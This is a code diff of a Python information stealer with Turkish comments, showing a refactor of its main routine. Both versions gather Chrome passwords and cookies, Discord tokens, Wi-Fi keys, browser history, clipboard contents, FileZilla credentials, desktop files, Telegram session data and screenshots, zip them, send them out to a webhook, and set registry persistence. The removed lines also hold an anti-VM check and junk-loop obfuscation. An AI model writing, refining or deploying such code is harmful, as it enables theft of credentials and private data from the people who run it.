+        winreg.SetValueEx(key, rand_name, 0, winreg.REG_SZ, target)
         winreg.CloseKey(key)
     except:
         pass
 
-# ---- ana iş parçacığı ----
-def worker(func, results, key, *args):
-    try:
-        results[key] = func(*args)
-    except:
-        results[key] = []
-
 def main():
-    antivm()  # eğer VM ise çık
-    temp_root = tempfile.mkdtemp(prefix=TEMP_DIR_PREFIX)
-    os.makedirs(os.path.join(temp_root, 'data'), exist_ok=True)
-
-    results = {}
-    threads = []
-
-    # thread'ler başlatılıyor
-    targs = [
-        ('system', get_system_info),
-        ('chrome_pass', get_chrome_passwords),
-        ('cookies', get_chrome_cookies),
-        ('discord', get_discord_tokens),
-        ('wifi', get_wifi_passwords),
-        ('history', get_browser_history),
-        ('clipboard', get_clipboard),
-        ('filezilla', get_filezilla_creds),
-        ('desktop_files', grab_desktop_files),
-        ('telegram', get_telegram_tdata)
-    ]
-    for key, func in targs:
-        t = threading.Thread(target=worker, args=(func, results, key))
-        t.start()
-        threads.append(t)
-
-    # ekran görüntüsü ayrı thread
-    sc_thread = threading.Thread(target=worker, args=(screenshot, results, 'screenshot'))
-    sc_thread.start()
-    threads.append(sc_thread)
-
-    for t in threads:
-        t.join()
-
-    # sonuçları dosyalara yaz
-    data_path = os.path.join(temp_root, 'data')
-    with open(os.path.join(data_path, 'system.txt'), 'w', encoding='utf-8') as f:
-        json.dump(results.get('system', {}), f, indent=2)
-    with open(os.path.join(data_path, 'passwords.json'), 'w') as f:
-        json.dump(results.get('chrome_pass', []), f)
-    with open(os.path.join(data_path, 'cookies.json'), 'w') as f:
-        json.dump(results.get('cookies', []), f)
-    with open(os.path.join(data_path, 'discord_tokens.txt'), 'w') as f:
-        f.write('\n'.join(results.get('discord', [])))
-    with open(os.path.join(data_path, 'wifi.json'), 'w') as f:
-        json.dump(results.get('wifi', []), f)
-    with open(os.path.join(data_path, 'history.json'), 'w') as f:
-        json.dump(results.get('history', []), f)
-    with open(os.path.join(data_path, 'clipboard.txt'), 'w', encoding='utf-8') as f:
-        f.write(results.get('clipboard', ''))
-    with open(os.path.join(data_path, 'filezilla.json'), 'w') as f:
-        json.dump(results.get('filezilla', []), f)
-    # masaüstü dosyalarını kopyala
-    desktop_files = results.get('desktop_files', [])
-    for src in desktop_files:
-        shutil.copy2(src, data_path)
-    telegram_data = results.get('telegram')
-    if telegram_data and os.path.isdir(telegram_data):
-        for item in os.listdir(telegram_data):
-            shutil.move(os.path.join(telegram_data, item), data_path)
-        os.rmdir(telegram_data)
-    scr = results.get('screenshot')
-    if scr and os.path.exists(scr):
-        shutil.move(scr, data_path)
-
-    # zip oluştur
-    zip_path = os.path.join(temp_root, 'out.zip')
-    zip_all_data(data_path, zip_path)
-
-    # exfiltrate
-    exfiltrate(zip_path, WEBHOOK_URL_ENC)
-
-    # persistence
-    persistence()
-
-    # temizlik
+    # anti_vm() çağrısı yorumlu
+    # if anti_vm():
+    #     return
+    temp_dir = os.path.join(tempfile.gettempdir(), uuid.uuid4().hex)
     try:
-        shutil.rmtree(temp_root)
+        collect_all(temp_dir)
+        zip_path = os.path.join(tempfile.gettempdir(), uuid.uuid4().hex + '.zip')
+        zip_data(temp_dir, zip_path)
+        exfiltrate(zip_path, WEBHOOK_URL)
+        persistence()
     except:
         pass
+    finally:
+        try:
+            shutil.rmtree(temp_dir, ignore_errors=True)
+            if os.path.exists(zip_path):
+                os.remove(zip_path)
+        except:
+            pass
 
 if __name__ == '__main__':
-    # junk kod (obfuscation)
-    for _ in range(100):
-        _ = 2+2
     main()
